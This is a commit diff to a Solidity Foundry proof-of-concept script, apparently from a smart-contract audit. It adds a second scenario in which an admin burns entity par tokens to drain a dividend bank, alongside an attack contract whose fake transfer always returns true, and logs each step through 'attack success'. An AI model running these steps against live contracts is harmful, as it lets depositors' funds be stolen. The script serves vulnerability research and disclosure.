74b7ff072f1ccc2b3ecad6eb04e3a3cfae1e9c14
Kevin Park <kevin@fruitful.gg>
2023-10-16 11:58:35 +0700

    test: system admin burns par tokens

--- script/poc/IM_24511.s.sol
+++ script/poc/IM_24511.s.sol
@@ -25,6 +25,16 @@ contract IM_24511 is Script {
     address sa = 0xE6aD24478bf7E1C0db07f7063A4019C83b1e5929;
     bytes32 public USDC_ID = LibHelpers._getIdForAddress(USDC_ADDRESS);
 
+    address user1 = makeAddr("user 1");
+    address user2 = makeAddr("user 2");
+    address attackEntity = address(new Attack0005());
+    address user3 = makeAddr("user 3");
+
+    bytes32 user1Id = user1._getIdForAddress();
+    bytes32 user2Id = user2._getIdForAddress();
+    bytes32 attackEntityId = attackEntity._getIdForAddress();
+    bytes32 user3Id = user3._getIdForAddress();
+
     function fundEntityUsdc(address to, uint256 amount) private {
         vm.startPrank(USDC_WHALE);
         usdc.transfer(to, amount);
@@ -37,18 +47,6 @@ contract IM_24511 is Script {
     Entity entity = Entity({ assetId: USDC_ID, collateralRatio: LC.BP_FACTOR, maxCapacity: 100 ether, utilizedCapacity: 0, simplePolicyEnabled: true });
 
     function run() public {
-        c.log(" ~~ create attack contract ~~".blue());
-
-        address user1 = makeAddr("user 1");
-        address user2 = makeAddr("user 2");
-        address attackEntity = address(new Attack0005());
-        address user3 = makeAddr("user 3");
-
-        bytes32 user1Id = user1._getIdForAddress();
-        bytes32 user2Id = user2._getIdForAddress();
-        bytes32 attackEntityId = attackEntity._getIdForAddress();
-        bytes32 user3Id = user3._getIdForAddress();
-
         // user1's parent is user1
         // user2's parent is attack contract
         c.log(" ~~ create entities ~~".blue());
@@ -96,27 +94,146 @@ contract IM_24511 is Script {
 
         c.log("!!!!!!!!!! attack start !!!!!!!!!!");
 
+        // vm.startPrank(sa);
+        // n.startTokenSale(user1Id, 1e6, 1e6);
+
+        // vm.startPrank(user1);
+        // n.executeLimitOffer(USDC_ID, 1e6, user1Id, 1e6);
+
         vm.startPrank(sa);
         n.startTokenSale(attackEntityId, 1e6, 1e6);
 
         vm.startPrank(user2);
         n.executeLimitOffer(USDC_ID, 1e6, attackEntityId, 1e6);
 
-        c.log(">>>>> attack entity admin burn some entity tokens ...");
-        n.externalWithdrawFromEntity(attackEntityId, user2, attackEntity, 1e6);
+        c.log(" ~~ before burning ~~".blue());
         c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
         c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
 
-        c.log("user2 parent's internal USDC balance: %s", n.internalBalanceOf(n.getEntity(user2Id), USDC_ID));
+        c.log("user1's internal USDC balance: %s", n.internalBalanceOf(user1Id, USDC_ID));
+        c.log("user3's internal USDC balance: %s", n.internalBalanceOf(user3Id, USDC_ID));
 
-        vm.startPrank(user3);
-        n.withdrawDividend(user3Id, attackEntityId, USDC_ID);
+        vm.startPrank(sa);
+        // n.internalBurn(attackEntityId, attackEntityId, 1e6);
+        // n.internalBurn(attackEntityId, attackEntityId, 1e6);
+        n.internalBurn(user1Id, user1Id, 1e6);
+
+        // c.log(">>>>> attack entity admin burn some entity tokens ...");
+        // n.externalWithdrawFromEntity(attackEntityId, user2, attackEntity, 1e6);
+
+        c.log(" ~~ after burning ~~".blue());
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
+
+        // vm.startPrank(user1);
+        // n.withdrawDividend(user1Id, user1Id, USDC_ID);
+
+        c.log(" ~~ before withdrawing dividends ~~".blue());
+        c.log("user1's internal USDC balance: %s", n.internalBalanceOf(user1Id, USDC_ID));
+        c.log("user3's internal USDC balance: %s", n.internalBalanceOf(user3Id, USDC_ID));
+
+        vm.startPrank(user1);
+        n.withdrawDividend(user1Id, user1Id, USDC_ID);
+
+        c.log(" ~~ after withdrawing dividends ~~".blue());
+        // vm.startPrank(user3);
+        // n.withdrawDividend(user3Id, attackEntityId, USDC_ID);
         // note user1 has withdrawable dividends, but the dividend bank has been drained by the attack
         c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
         c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
         c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
 
         c.log("!!!!!!!!!! attack success !!!!!!!!!!");
+        c.log("user1's internal USDC balance: %s", n.internalBalanceOf(user1Id, USDC_ID));
+        c.log("user3's internal USDC balance: %s", n.internalBalanceOf(user3Id, USDC_ID));
+    }
+
+    function run2() public {
+        address userA1 = makeAddr("user A1");
+        bytes32 userA1EID = bytes32("userA1EID");
+        bytes32 userA1ID = userA1._getIdForAddress();
+
+        c.log(" ~~ create entities ~~".blue());
+        vm.startPrank(sa);
+        n.createEntity(user1Id, user1Id, entity, "user1 entity"); // note parent is the same as the user
+        n.createEntity(userA1EID, userA1ID, entity, "userA1 entity");
+
+        n.enableEntityTokenization(user1Id, "test_symbol", "test_name");
+        n.enableEntityTokenization(userA1EID, "test_symbol", "test_name");
+
+        c.log(" ~~ fund entities ~~".blue());
+        fundEntityUsdc(user1, 1000000 * 1e6);
+        fundEntityUsdc(user1, 1000000 * 1e6); // 1st payDividend
+        fundEntityUsdc(userA1, 1000000 * 1e6);
+        fundEntityUsdc(userA1, 1000000 * 1e6); // 2nd payDividend
+        fundEntityUsdc(userA1, 1000000 * 1e6); // 3rd payDividend
+
+        c.log(" ~~ user1Id ptoken setup ~~".blue());
+        vm.startPrank(sa);
+        n.startTokenSale(user1Id, 1e6, 1e6);
+
+        vm.startPrank(user1);
+        n.executeLimitOffer(USDC_ID, 1e6, user1Id, 1e6);
+
+        c.log(" user1 has %s user1Id ptoken", n.internalBalanceOf(user1Id, user1Id));
+
+        n.payDividendFromEntity(0x0000000000000000000000000000000000000000000000000000000000000011, 1000000 * 1e6);
+        c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+
+        c.log(" ~~ userA1 ptoken setup ~~".blue());
+        vm.startPrank(sa);
+        n.startTokenSale(userA1EID, 1e6, 1e6);
+
+        vm.startPrank(userA1);
+        n.executeLimitOffer(USDC_ID, 1e6, userA1EID, 1e6); // note user3 cannot directly purchase the par tokens because user3 doesn't have an existing parent
+        n.internalTransferFromEntity(user3Id, userA1EID, 1e6);
+
+        c.log(" user3 has %s userA1EID ptoken", n.internalBalanceOf(user3Id, userA1EID));
+
+        n.payDividendFromEntity(0x0000000000000000000000000000000000000000000000000000000000000022, 1000000 * 1e6);
+        c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, userA1EID, USDC_ID));
+
+        c.log("!!!!!!!!!! attack start !!!!!!!!!!");
+
+        vm.startPrank(sa);
+        n.startTokenSale(userA1EID, 1e6, 1e6);
+
+        vm.startPrank(userA1);
+        n.executeLimitOffer(USDC_ID, 1e6, userA1EID, 1e6);
+
+        c.log(" ~~ before burning ~~".blue());
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, userA1EID, USDC_ID));
+
+        c.log("user1's internal USDC balance: %s", n.internalBalanceOf(user1Id, USDC_ID));
+        c.log("user3's internal USDC balance: %s", n.internalBalanceOf(user3Id, USDC_ID));
+
+        c.log(">>>>> system admin burn some entity tokens ...");
+        vm.startPrank(sa);
+        n.internalBurn(userA1EID, userA1EID, 1e6);
+
+        c.log(" ~~ after burning ~~".blue());
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, userA1EID, USDC_ID));
+
+        vm.startPrank(user3);
+        n.withdrawDividend(user3Id, userA1EID, USDC_ID);
+
+        c.log(" ~~ before withdrawing dividends ~~".blue());
+        c.log("user1's internal USDC balance: %s", n.internalBalanceOf(user1Id, USDC_ID));
+        c.log("user3's internal USDC balance: %s", n.internalBalanceOf(user3Id, USDC_ID));
+
+        c.log(" ~~ after withdrawing dividends ~~".blue());
+        // note user1 has withdrawable dividends, but the dividend bank has been drained by the attack
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
+        c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
+
+        c.log("!!!!!!!!!! attack success !!!!!!!!!!");
+        c.log("user1's internal USDC balance: %s", n.internalBalanceOf(user1Id, USDC_ID));
         c.log("user3's internal USDC balance: %s", n.internalBalanceOf(user3Id, USDC_ID));
     }
 }
@@ -130,7 +247,7 @@ contract Attack0005 {
         return 18;
     }
 
-    function transfer(address to, uint256 value) public pure returns (bool) {
+    function transfer(address, uint256) public pure returns (bool) {
         return true;
     }
 }
